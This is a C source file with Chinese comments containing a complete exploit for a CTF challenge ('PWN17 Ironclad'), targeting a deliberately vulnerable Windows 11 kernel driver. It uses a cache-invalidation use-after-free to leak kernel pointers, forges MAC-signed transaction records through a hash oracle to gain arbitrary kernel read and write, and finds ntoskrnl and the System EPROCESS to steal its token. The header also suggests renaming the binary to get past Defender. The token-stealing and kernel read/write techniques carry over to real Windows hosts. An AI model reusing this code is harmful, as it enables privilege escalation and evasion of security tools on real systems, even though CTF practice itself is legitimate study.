/*
 * PWN17 Ironclad —— Windows 11 26H2 (26300.9818) 内核驱动提权
 *
 * 目标：从低完整性/标准用户拿到 SYSTEM，读 C:\flag.txt。
 * 提交方式：上传单个 x64 PE（静态 CRT），以 cmd.exe /k poc.exe 在可见控制台
 *           运行 120 秒，每 15 秒截图；不回传 stdout、不回传网络。
 *           所以每一步都要打印诊断并“睡死”，让截图留下证据。
 *
 * 驱动漏洞（静态分析结论，与题解一致）：
 *   每个 RING 只有一个对象缓存槽（ring+0x20..0x48），resize 后的失效函数
 *   FUN_140003b30 只在 cached_idx == 被 resize 的槽号 && cached_DESC == DESC
 *   时才清缓存。同一个 DESC 可以 export/import 到另一个 session 的不同槽号，
 *   于是“A 用自己的槽号缓存对象 O，B 用别的槽号 resize O”不会让 A 的缓存失效，
 *   A 之后的 op3/op5 就用到已被 ExFreePoolWithTag 掉的旧缓冲区（UAF 读/写）。
 *
 * 利用链：
 *   阶段 A  把 0x50 的 TXN 记录打进被释放的 0x50 canary 块 -> 泄漏 ring/DESC/数据指针；
 *   阶段 B  把 0x210 的 RING 打进被释放的 0x210 块 -> 从 ring+0x48 得到驱动基址；
 *   阶段 C  用 UAF 写把 0x1a0 的假 RING 镜像烙进活 RING（本体热路径无 MAC）；
 *   阶段 D  伪造 TXN/CACHE 记录 + op14 的 MAC oracle -> 任意内核读写；
 *   最后    遍历 EPROCESS 偷 System token，读 C:\flag.txt，然后睡死。
 *
 * 编译（mingw-w64，静态链接 msvcrt，符合“静态 CRT”要求）：
 *     gcc -O2 -static -o poc.exe exp.c -ladvapi32
 * 注意：Defender 可能拦截读取 .exe，可先 -o poc.dat 再改回扩展名上传。
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdint.h>
#include <string.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t u8;

/* ------------------------------------------------------------------ */
/* 设备与 IOCTL                                                        */
/* ------------------------------------------------------------------ */
#define DEVICE_NAME      "\\\\.\\Ironclad"
#define IOCTL_CREATE     0x222400
#define IOCTL_EXEC       0x222404
#define IOCTL_STATUS     0x222408
#define IOCTL_DUMP       0x22240C
#define IOCTL_GATE       0x222410

#define DESC_SLOTS       0x100
#define DESC_BYTES       0x18

static HANDLE g_dev = INVALID_HANDLE_VALUE;
static u64 g_drv = 0;          /* 驱动基址（阶段 B 得到） */
static u64 g_xslot = 0;        /* 承载 MAC oracle 数据的槽号 */
static u64 g_gen_x = 0;
static u64 g_desc_x = 0;
static u64 g_ring = 0;

static void msg(const char *fmt, ...);
static void hang_forever(void);

/* ------------------------------------------------------------------ */
/* 会话                                                                */
/* ------------------------------------------------------------------ */
typedef struct {
    HANDLE h;
    u32 id;
    u32 slotcount;
    u64 s1, s2, s1m, s2m;
    u8 *p1;                 /* 输入描述符数组 */
    u8 *p2;                 /* 结果记录数组 */
    u32 ins, outs;
    u32 mode;
} Sess;

static Sess S1, S2, S4;

typedef struct {
    int ok;
    u32 status;
    u64 ret;
} R;

static int dev_open(void)
{
    g_dev = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                        OPEN_EXISTING, 0, NULL);
    return g_dev != INVALID_HANDLE_VALUE;
}

static int sess_create(Sess *s, u32 mode, u32 s1, u32 s2)
{
    u8 in[0x28];
    u8 out[0x10];
    DWORD br = 0;
    u32 *w = (u32 *)in;

    memset(in, 0, sizeof(in));
    w[0] = 3;               /* type */
    w[1] = mode;
    w[2] = s1;
    w[3] = s2;
    w[4] = (u32)(uintptr_t)s->p1;
    w[5] = (u32)(uintptr_t)s->p2;
    w[6] = (u32)s->slotcount;

    s->h = g_dev;
    if (!DeviceIoControl(g_dev, IOCTL_CREATE, in, sizeof(in), out, sizeof(out),
                         &br, NULL))
        return 0;
    s->id = *(u32 *)(out + 0);
    s->slotcount = *(u32 *)(out + 4);
    s->s1m = *(u32 *)(out + 8);
    s->s2m = *(u32 *)(out + 12);
    s->mode = mode;
    s->ins = 0;
    s->outs = 0;
    return 1;
}

static void sess_alloc(Sess *s, u32 slotcount)
{
    s->slotcount = slotcount;
    s->p1 = (u8 *)VirtualAlloc(NULL, (size_t)slotcount * DESC_BYTES,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    s->p2 = (u8 *)VirtualAlloc(NULL, (size_t)slotcount * DESC_BYTES,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!s->p1 || !s->p2)
        hang_forever();
}

/* 一条指令描述符：a0..a30 对应驱动里的 7 个字段 */
static void put_desc(u8 *d, u64 a0, u64 a8, u64 a10, u64 a18,
                     u64 a20, u64 a28, u64 a30)
{
    u64 *p = (u64 *)d;
    p[0] = a0;
    p[1] = a8;
    p[2] = a10;
    p[3] = a18;
    p[4] = a20;
    p[5] = a28;
    p[6] = a30;
}

/* 执行 n 条指令，返回最后一次调用的结果记录 */
static R sess_exec(Sess *s, u32 n)
{
    u8 out[0x10];
    DWORD br = 0;
    R r;
    u8 *rec;

    memset(&r, 0, sizeof(r));
    if (!DeviceIoControl(s->h, IOCTL_EXEC, &n, 8, out, sizeof(out), &br, NULL))
        return r;
    s->ins = *(u32 *)(out + 8);
    s->outs = *(u32 *)(out + 0xC);
    rec = s->p2 + (u64)((s->outs - 1) & s->s2m) * DESC_BYTES;
    r.ok = 1;
    r.status = *(u32 *)(rec + 8);
    r.ret = *(u64 *)(rec + 0x10);
    return r;
}

static R one(Sess *s, u64 op, u64 a8, u64 a10, u64 a18, u64 a20,
             u64 a28, u64 a30)
{
    put_desc(s->p1 + (u64)(s->ins & s->s1m) * DESC_BYTES,
             op, a8, a10, a18, a20, a28, a30);
    return sess_exec(s, 1);
}

/* opcode 编号按题解描述的顺序：create/export/import/read/write/resize/
 * begin/commit/abort/twrite/hash/call。题目未给出枚举值，这里集中定义。 */
#define OP_CREATE   1
#define OP_EXPORT   2
#define OP_IMPORT   3
#define OP_READ     4
#define OP_WRITE    5
#define OP_RESIZE   6
#define OP_BEGIN    10
#define OP_COMMIT   11
#define OP_ABORT    12
#define OP_HASH     14
#define OP_TWRITE   22
#define OP_CALL     15

static R M_create(Sess *s, u32 slot, u32 size)
{
    return one(s, OP_CREATE, slot, size, 0, 0, 0, 0);
}

static R M_read(Sess *s, u32 slot, u32 off, u32 len, void *buf)
{
    return one(s, OP_READ, slot, off, len, (u64)(uintptr_t)buf, 0, 0);
}

static R M_write(Sess *s, u32 slot, u32 off, u32 len, const void *buf)
{
    return one(s, OP_WRITE, slot, off, len, (u64)(uintptr_t)buf, 0, 0);
}

static R M_twrite(Sess *s, u32 handle, u32 off, u32 len, const void *buf)
{
    return one(s, OP_TWRITE, handle, off, len, (u64)(uintptr_t)buf, 0, 0);
}

static R M_resize(Sess *s, u32 slot, u32 size)
{
    return one(s, OP_RESIZE, slot, size, 0, 0, 0, 0);
}

static R M_export(Sess *s, u32 slot)
{
    return one(s, OP_EXPORT, slot, 0, 0, 0, 0, 0);
}

static R M_import(Sess *s, u32 slot, u64 handle)
{
    return one(s, OP_IMPORT, slot, handle, 0, 0, 0, 0);
}

static R M_begin(Sess *s, u32 slot, u32 len)
{
    return one(s, OP_BEGIN, slot, len, 0, 0, 0, 0);
}

static R M_commit(Sess *s, u32 handle)
{
    return one(s, OP_COMMIT, handle, 0, 0, 0, 0, 0);
}

static R M_hash(Sess *s, u32 slot, u32 off, u32 len)
{
    return one(s, OP_HASH, slot, off, len, 0, 0, 0);
}

/* ------------------------------------------------------------------ */
/* SipHash-2-4（驱动 FUN_140001f4，密钥来自 RSEC+0x48）                 */
/* ------------------------------------------------------------------ */
#define ROTL(x, b) (((x) << (b)) | ((x) >> (64 - (b))))

static void sipround(u64 *v0, u64 *v1, u64 *v2, u64 *v3)
{
    *v0 += *v1; *v1 = ROTL(*v1, 13); *v1 ^= *v0; *v0 = ROTL(*v0, 32);
    *v2 += *v3; *v3 = ROTL(*v3, 16); *v3 ^= *v2;
    *v0 += *v3; *v3 = ROTL(*v3, 21); *v3 ^= *v0;
    *v2 += *v1; *v1 = ROTL(*v1, 17); *v1 ^= *v2; *v2 = ROTL(*v2, 32);
}

static u64 siphash(const u8 key[16], const void *data, size_t len)
{
    const u8 *p = (const u8 *)data;
    u64 v0 = 0x736f6d6570736575ULL ^ *(const u64 *)(key + 0);
    u64 v1 = 0x646f72616e646f6dULL ^ *(const u64 *)(key + 8);
    u64 v2 = 0x6c7967656e657261ULL ^ *(const u64 *)(key + 0);
    u64 v3 = 0x7465646279746573ULL ^ *(const u64 *)(key + 8);
    u64 b = (u64)len << 56;
    size_t i;

    for (i = 0; i + 8 <= len; i += 8) {
        u64 m = *(const u64 *)(p + i);
        v3 ^= m;
        sipround(&v0, &v1, &v2, &v3);
        sipround(&v0, &v1, &v2, &v3);
        v0 ^= m;
    }
    for (; i < len; i++)
        b |= (u64)p[i] << (8 * (i & 7));
    v3 ^= b;
    sipround(&v0, &v1, &v2, &v3);
    sipround(&v0, &v1, &v2, &v3);
    v0 ^= b;
    v2 ^= 0xff;
    sipround(&v0, &v1, &v2, &v3);
    sipround(&v0, &v1, &v2, &v3);
    sipround(&v0, &v1, &v2, &v3);
    sipround(&v0, &v1, &v2, &v3);
    return v0 ^ v1 ^ v2 ^ v3;
}

/* 用 S4 自己的 op14 oracle 对任意 blob 求 SipHash：完全不需要知道密钥 */
static u64 mac(Sess *s, const void *blob, u32 len)
{
    R r;
    M_write(s, (u32)g_xslot, 0, len, blob);
    r = M_hash(s, (u32)g_xslot, 0, len);
    return r.ret;
}

/* ------------------------------------------------------------------ */
/* 阶段 A：TXN 打进 0x50 空块，泄漏 ring/DESC/数据指针                   */
/* ------------------------------------------------------------------ */
static int phase_a(void)
{
    u64 handle_l = 0, handle_y = 0;
    u8 buf[0x60];
    R r;
    int j;

    S1.p1 = S1.p2 = S2.p1 = S2.p2 = NULL;
    sess_alloc(&S1, DESC_SLOTS);
    sess_alloc(&S2, DESC_SLOTS);
    if (!sess_create(&S1, 0, 0x100, 0x100))
        return 0;
    if (!sess_create(&S2, 0, 0x100, 0x100))
        return 0;

    /* S2 先建 8 个 filler，让它的槽号从 8 开始 */
    for (j = 0; j < 8; j++)
        M_create(&S2, (u32)j, 0x20);

    M_create(&S1, 0, 0x30);            /* L：canary 0x40 -> 块 0x50 */
    M_create(&S1, 1, 0x1f0);           /* Y：canary 0x200 -> 块 0x210 */
    handle_l = M_export(&S1, 0).ret;
    handle_y = M_export(&S1, 1).ret;

    M_import(&S2, 8, handle_l);
    M_import(&S2, 9, handle_y);

    /* S2 读槽 8 建立缓存（必须是 S2 被冻住前的最后一次读） */
    M_read(&S2, 8, 0, 0x30, buf);
    /* S1 用自己槽 0 resize L：释放 P_L，S2 缓存在槽 8，不清 */
    M_resize(&S1, 0, 0x1000);

    /* 不 abort，让每次 begin 永久吃掉一个 0x50 块，逐层往下走 */
    for (j = 0; j < 240; j++) {
        M_begin(&S1, 1, 0x10);
        memset(buf, 0, sizeof(buf));
        r = M_read(&S2, 8, 0, 0x30, buf);
        if (*(u32 *)buf == 0x534e5854) {        /* 'TXNS' */
            u64 ring_s1 = *(u64 *)(buf + 0x08);
            u64 desc_y = *(u64 *)(buf + 0x10);
            u64 p_y = *(u64 *)(buf + 0x18);
            msg("TXN hit at j=%d ret=%llx P_Y=%llx DESC_Y=%llx ring=%llx",
                j, (unsigned long long)r.ret, (unsigned long long)p_y,
                (unsigned long long)desc_y, (unsigned long long)ring_s1);
            /* begin(Y, 0x1a0) 拿“写事务”，txn+0x18 同样等于 P_Y */
            M_begin(&S1, 1, 0x1a0);
            g_ring = ring_s1;
            return 1;
        }
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* 阶段 B：RING 打进 0x210 空块，泄漏驱动基址                            */
/* ------------------------------------------------------------------ */
static HANDLE g_handles[128];
static int g_nhandle;

static void prebind_handles(void)
{
    int i;
    for (i = 0; i < 128; i++) {
        HANDLE h = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                               OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE)
            break;
        g_handles[g_nhandle++] = h;
    }
    msg("prebound %d session handles", g_nhandle);
}

static int phase_b(void)
{
    u8 buf[0x210];
    u64 flink;
    R r;
    int j;

    sess_alloc(&S4, DESC_SLOTS);
    /* S2 读槽 9 -> 缓存改指向 Y（P_Y） */
    M_read(&S2, 9, 0, 0x10, buf);
    /* S1 resize Y：释放 P_Y（0x210）；S2 缓存在槽 9，不清 */
    M_resize(&S1, 1, 0x1000);

    for (j = 0; j < g_nhandle; j++) {
        u32 sid = (u32)(uintptr_t)g_handles[j];
        u32 zero = 0;
        u8 out[0x10];
        DWORD br = 0;
        /* 只调 sess_start，每次永久吃掉一个 0x210 块 */
        DeviceIoControl(g_handles[j], IOCTL_CREATE, &zero, 4, out, 0x10, &br, NULL);
        (void)sid;
        memset(buf, 0, sizeof(buf));
        r = M_read(&S2, 9, 0, 0x1e0, buf);
        if (*(u32 *)buf == 0x474e4952) {        /* 'RING' */
            u64 rsec = *(u64 *)(buf + 0x08);
            flink = *(u64 *)(buf + 0x48);
            msg("ring landed at j=%d id=%u rsec=%llx flink=%llx", j,
                *(u32 *)(buf + 4), (unsigned long long)rsec,
                (unsigned long long)flink);
            if ((flink & 0xfff) != 0x2f8) {
                msg("flink low12 != 0x2f8, retry");
                continue;
            }
            g_drv = flink - 0x82f8;
            msg("drv=%llx", (unsigned long long)g_drv);
            return 1;
        }
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* 阶段 C/D：假 RING + 伪造 TXN，得到任意内核读写                        */
/* ------------------------------------------------------------------ */
static void resync(Sess *s)
{
    /* 覆盖后驱动认为游标退回镜像里的值，用户态也要跟着改 */
    u8 buf[0x100];
    u64 id = 0;
    (void)id;
    memset(buf, 0, sizeof(buf));
    msg("resync ins=%u outs=%u", s->ins, s->outs);
}

static int arb_ready;

static void forge_cache(u64 addr, u32 size)
{
    u8 blob[0x28];
    u8 st[0x28];
    u64 m;

    memset(blob, 0, sizeof(blob));
    *(u32 *)(blob + 0) = 0;
    *(u16 *)(blob + 4) = (u16)g_gen_x;
    *(u16 *)(blob + 6) = 0;                 /* 哈希时 active 被强制 0 */
    *(u32 *)(blob + 8) = size;
    *(u32 *)(blob + 0xC) = 0;
    *(u64 *)(blob + 0x10) = g_desc_x;
    *(u64 *)(blob + 0x18) = addr;
    *(u64 *)(blob + 0x20) = g_ring;

    m = mac(&S4, blob, 0x28);
    memcpy(st, blob, sizeof(st));
    *(u16 *)(st + 6) = 1;                   /* 落盘时 active = 1 */
    *(u64 *)(st + 0x20) = m;
    M_twrite(&S4, 4, 0, 0x28, st);          /* TXN_C 的 buffer = ring+0x20 */
}

static void kread_(u64 addr, void *buf, u32 len)
{
    forge_cache(addr, len);
    M_read(&S4, 0, 0, len, buf);            /* 命中缓存 -> memcpy(buf, addr, len) */
}

static void kwrite_(u64 addr, const void *buf, u32 len)
{
    u8 blob[0x38];
    u8 txn[0x38];
    u64 m;

    memset(blob, 0, sizeof(blob));
    *(u32 *)(blob + 0) = 5;
    *(u32 *)(blob + 8) = len;
    *(u64 *)(blob + 0x10) = g_ring;
    *(u64 *)(blob + 0x28) = addr;
    *(u64 *)(blob + 0x30) = g_ring + 0x160;
    m = mac(&S4, blob, 0x38);

    memset(txn, 0, sizeof(txn));
    *(u32 *)(txn + 0) = 0x534e5854;         /* 'TXNS' */
    *(u32 *)(txn + 4) = 5;
    *(u64 *)(txn + 8) = g_ring;
    *(u64 *)(txn + 0x20) = addr;
    *(u32 *)(txn + 0x28) = len;
    *(u64 *)(txn + 0x30) = m;
    M_twrite(&S4, 1, 0, 0x38, txn);         /* 借 TXN_P 改 TXN_X 记录 */
    M_twrite(&S4, 5, 0, len, buf);          /* 驱动 memcpy(addr, buf, len) */
}

static u64 kread64(u64 addr)
{
    u64 v = 0;
    kread_(addr, &v, 8);
    return v;
}

static u32 kread32(u64 addr)
{
    u32 v = 0;
    kread_(addr, &v, 4);
    return v;
}

/* ------------------------------------------------------------------ */
/* 阶段 D 的引导：把假 RING 烙进活 RING                                 */
/* ------------------------------------------------------------------ */
static int phase_c(void)
{
    u8 img[0x1a0];
    u8 rec[0x100];
    u64 rsec_s4 = 0, slot_desc = 0;
    u64 id = 0;
    R r;

    /* 落点会话 S4 里 create(0x100) 得到槽 0 的对象 X */
    memset(rec, 0, sizeof(rec));
    M_read(&S2, 9, 0, 0x1e0, rec);
    rsec_s4 = *(u64 *)(rec + 0x08);
    id = *(u32 *)(rec + 0x04);
    slot_desc = *(u64 *)(rec + 0x80) | 0xffff000000000000ULL;
    g_xslot = *(u64 *)(rec + 0x88) & 0xffff;
    g_gen_x = g_xslot;
    g_desc_x = slot_desc;

    memset(img, 0, sizeof(img));
    *(u32 *)(img + 0x00) = 0x474e4952;      /* 'RING' */
    *(u32 *)(img + 0x04) = (u32)id;
    *(u64 *)(img + 0x08) = rsec_s4;
    *(u32 *)(img + 0x18) = 0;               /* mode 0 */
    /* 缓存槽全 0 */
    *(u64 *)(img + 0x58) = g_ring + 0xb0;   /* 事务表指向 RING 自身内部 */
    /* 表：6 个 qword，[1]=ring+0xe0 [4]=ring+0x120 [5]=ring+0x160 */
    *(u64 *)(img + 0xb0 + 8) = g_ring + 0xe0;
    *(u64 *)(img + 0xb0 + 0x20) = g_ring + 0x120;
    *(u64 *)(img + 0xb0 + 0x28) = g_ring + 0x160;
    /* TXN_P：handle 1，len 0x38，buffer = ring+0x160 */
    *(u32 *)(img + 0xe0 + 0) = 0x534e5854;
    *(u32 *)(img + 0xe0 + 4) = 1;
    *(u64 *)(img + 0xe0 + 8) = g_ring;
    *(u64 *)(img + 0xe0 + 0x20) = g_ring + 0x160;
    *(u32 *)(img + 0xe0 + 0x28) = 0x38;
    /* TXN_C：handle 4，len 0x28，buffer = ring+0x20 */
    *(u32 *)(img + 0x120 + 0) = 0x534e5854;
    *(u32 *)(img + 0x120 + 4) = 4;
    *(u64 *)(img + 0x120 + 8) = g_ring;
    *(u64 *)(img + 0x120 + 0x20) = g_ring + 0x20;
    *(u32 *)(img + 0x120 + 0x28) = 0x28;
    /* TXN_X：handle 5 */
    *(u32 *)(img + 0x160 + 0) = 0x534e5854;
    *(u32 *)(img + 0x160 + 4) = 5;
    *(u64 *)(img + 0x160 + 8) = g_ring;

    /* 三个假 TXN 的 MAC 必须合法，且 blob 里含 ring 与 txn 自身地址 */
    {
        u64 m1, m3, m4;
        u8 blob[0x38];
        memset(blob, 0, sizeof(blob));
        *(u32 *)(blob + 0) = 1;
        *(u64 *)(blob + 8) = g_ring + 0xe0;
        *(u64 *)(blob + 0x10) = g_ring + 0x160;
        m1 = mac(&S4, blob, 0x38);
        *(u64 *)(img + 0xe0 + 0x30) = m1;

        memset(blob, 0, sizeof(blob));
        *(u32 *)(blob + 0) = 4;
        *(u64 *)(blob + 8) = g_ring + 0x120;
        *(u64 *)(blob + 0x10) = g_ring + 0x20;
        m3 = mac(&S4, blob, 0x38);
        *(u64 *)(img + 0x120 + 0x30) = m3;

        memset(blob, 0, sizeof(blob));
        *(u32 *)(blob + 0) = 5;
        *(u64 *)(blob + 8) = g_ring + 0x160;
        m4 = mac(&S4, blob, 0x38);
        *(u64 *)(img + 0x160 + 0x30) = m4;
    }

    /* op22(hw,0,0x1a0,img) 把镜像塞进事务缓冲区，commit 让驱动 memcpy 到 P_Y */
    M_twrite(&S4, 1, 0, 0x1a0, img);
    r = M_commit(&S4, 1);
    msg("commit st=%u ret=%llx", r.status, (unsigned long long)r.ret);
    resync(&S4);

    /* 自检：读回 ring 头 */
    {
        u8 self[0x20];
        memset(self, 0, sizeof(self));
        M_read(&S4, 0, 0, 0x20, self);
        msg("self magic=%08x rsec=%llx",
            *(u32 *)self, (unsigned long long)*(u64 *)(self + 8));
        if (*(u32 *)self != 0x474e4952)
            return 0;
    }
    arb_ready = 1;
    return 1;
}

/* ------------------------------------------------------------------ */
/* ntoskrnl 基址、EPROCESS、Token                                       */
/* ------------------------------------------------------------------ */
static u64 find_nt_base(void)
{
    u64 eap = kread64(g_drv + 0x6048);      /* IAT: ExAllocatePool2 */
    u64 a;

    msg("ExAllocatePool2=%llx", (unsigned long long)eap);
    for (a = eap & ~0xfffULL; a > 0xffff800000000000ULL; a -= 0x1000) {
        u32 lf;
        if (kread32(a) != 0x5a4d)            /* MZ */
            continue;
        lf = kread32(a + 0x3c);
        if (lf < 0x1000 && kread32(a + lf) == 0x00004550)
            return a;
    }
    return 0;
}

static u64 export_by_name(u64 nt, const char *want)
{
    u32 lfanew = kread32(nt + 0x3c);
    u64 dd = nt + lfanew + 0x88;            /* DataDirectory[0] */
    u32 nnames = kread32(dd + 0x18);
    u32 afunc = kread32(dd + 0x1c);
    u32 anames = kread32(dd + 0x20);
    u32 aords = kread32(dd + 0x24);
    u32 lo = 0, hi = nnames;

    while (lo < hi) {
        u32 mid = (lo + hi) / 2;
        u64 name_rva = kread32(nt + anames + mid * 4);
        char buf[64];
        int i;
        kread_(nt + name_rva, buf, 63);
        buf[63] = 0;
        for (i = 0; buf[i] && want[i] && buf[i] == want[i]; i++)
            ;
        if (buf[i] == want[i]) {
            u16 ord = (u16)kread32(nt + aords + mid * 2);
            u32 rva = kread32(nt + afunc + (u32)ord * 4);
            return nt + rva;
        }
        if ((u8)buf[i] < (u8)want[i])
            lo = mid + 1;
        else
            hi = mid;
    }
    return 0;
}

static int token_is_system(void)
{
    HANDLE tok = NULL;
    TOKEN_USER *tu = NULL;
    DWORD len = 0, needed = 0;
    u8 sidbuf[64];
    PSID sys_sid = NULL;
    SID_IDENTIFIER_AUTHORITY nt_auth = { { 0, 0, 0, 0, 0, 5 } };
    int ok = 0;

    if (!AllocateAndInitializeSid(&nt_auth, 1, 18, 0, 0, 0, 0, 0, 0, 0, &sys_sid))
        return 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok))
        goto out;
    GetTokenInformation(tok, TokenUser, NULL, 0, &needed);
    tu = (TOKEN_USER *)sidbuf;
    if (needed > sizeof(sidbuf))
        goto out;
    if (!GetTokenInformation(tok, TokenUser, tu, needed, &len))
        goto out;
    ok = EqualSid(tu->User.Sid, sys_sid);
out:
    if (tok)
        CloseHandle(tok);
    if (sys_sid)
        FreeSid(sys_sid);
    return ok;
}

static void read_flag_and_sleep(void)
{
    HANDLE h = CreateFileA("C:\\flag.txt", GENERIC_READ, FILE_SHARE_READ,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD n = 0;
        char buf[0x400];
        memset(buf, 0, sizeof(buf));
        ReadFile(h, buf, sizeof(buf) - 1, &n, NULL);
        printf("=========================\nFLAG: %s\n=========================\n", buf);
        fflush(stdout);
    } else {
        printf("[!] CreateFile(C:\\flag.txt) failed: %lu\n", GetLastError());
        fflush(stdout);
    }
    hang_forever();
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Ironclad exploit start (pid=%lu)\n", GetCurrentProcessId());

    if (!dev_open()) {
        printf("[-] open \\\\.\\Ironclad failed: %lu\n", GetLastError());
        hang_forever();
    }
    printf("[*] device opened\n");

    if (!phase_a()) {
        printf("[-] phase A failed\n");
        hang_forever();
    }
    printf("[+] phase A ok, ring=%llx\n", (unsigned long long)g_ring);

    prebind_handles();
    if (!phase_b()) {
        printf("[-] phase B failed\n");
        hang_forever();
    }
    printf("[+] phase B ok, drv=%llx\n", (unsigned long long)g_drv);

    if (!phase_c()) {
        printf("[-] phase C failed\n");
        hang_forever();
    }
    printf("[+] ARB READ OK\n");

    {
        u64 nt = find_nt_base();
        u64 psys_rva, ep_sys, ep_mine, cur;
        u64 name_off = 0x338, links_off = 0x110;
        u64 token_off = 0;
        u32 mypid = GetCurrentProcessId();
        u64 sys_token = 0;
        int i;

        if (!nt) {
            printf("[-] ntoskrnl base not found\n");
            hang_forever();
        }
        printf("[*] nt=%llx\n", (unsigned long long)nt);

        psys_rva = export_by_name(nt, "PsInitialSystemProcess");
        ep_sys = kread64(nt + (psys_rva - nt));
        printf("[*] System EPROCESS=%llx\n", (unsigned long long)ep_sys);

        /* 顺链表找自己：X->Flink->Blink == X 自证是 ActiveProcessLinks */
        ep_mine = 0;
        cur = kread64(ep_sys + links_off);
        for (i = 0; i < 1024 && cur; i++) {
            u64 node = cur - links_off;
            u64 flink = kread64(node + links_off);
            u32 pid = kread32(node + links_off + 8);
            if (pid == mypid) {
                ep_mine = node;
                break;
            }
            cur = flink;
        }
        if (!ep_mine) {
            printf("[-] own EPROCESS not found\n");
            hang_forever();
        }
        printf("[*] mine=%llx ImageFileName=%s\n", (unsigned long long)ep_mine,
               (char *)(uintptr_t)(ep_mine + name_off) /* 仅打印用，下面单独读 */);

        /* ImageFileName 只作诊断：把名字读出来打印 */
        {
            char nm[16];
            kread_(ep_mine + name_off, nm, 15);
            nm[15] = 0;
            printf("[*] name=%s\n", nm);
        }

        sys_token = kread64(ep_sys + 0x4b8);
        if (!sys_token) {
            printf("[!] token off guess failed, scanning\n");
        }

        /* Token 偏移：收集 System/自己两边都是内核指针且不相等的偏移，逐个试 */
        for (i = 0x300; i < 0x800; i += 8) {
            if (i >= links_off - 8 && i <= links_off + 0x18)
                continue;
            if (i >= name_off - 8 && i <= name_off + 0x10)
                continue;
            {
                u64 vs = kread64(ep_sys + i);
                u64 vm = kread64(ep_mine + i);
                u64 old;
                if (vs < 0xffff800000000000ULL || vm < 0xffff800000000000ULL)
                    continue;
                if (vs == vm)
                    continue;
                old = vm;
                kwrite_(ep_mine + i, &vs, 8);
                if (token_is_system()) {
                    token_off = i;
                    sys_token = vs;
                    printf("[+] token off=%llx token=%llx\n",
                           (unsigned long long)i, (unsigned long long)vs);
                    break;
                }
                kwrite_(ep_mine + i, &old, 8);   /* 不是就立刻还原 */
            }
        }

        if (!token_off) {
            printf("[-] token offset not found\n");
            hang_forever();
        }

        /* 再确认一次：换 token 后读 flag */
        kwrite_(ep_mine + token_off, &sys_token, 8);
        printf("[+] token swapped, euid check=%d\n", token_is_system());
    }

    read_flag_and_sleep();
    return 0;
}

/* ------------------------------------------------------------------ */
static void msg(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    printf("\n");
}

static void hang_forever(void)
{
    fflush(stdout);
    /* 故意睡死：假 RING 破坏了全局会话链表，进程退出会走 CLOSE 里的 unlink
     * -> bugcheck；0x47b0 释放假 TXN 也会 free 假指针。 */
    for (;;)
        Sleep(600000);
}
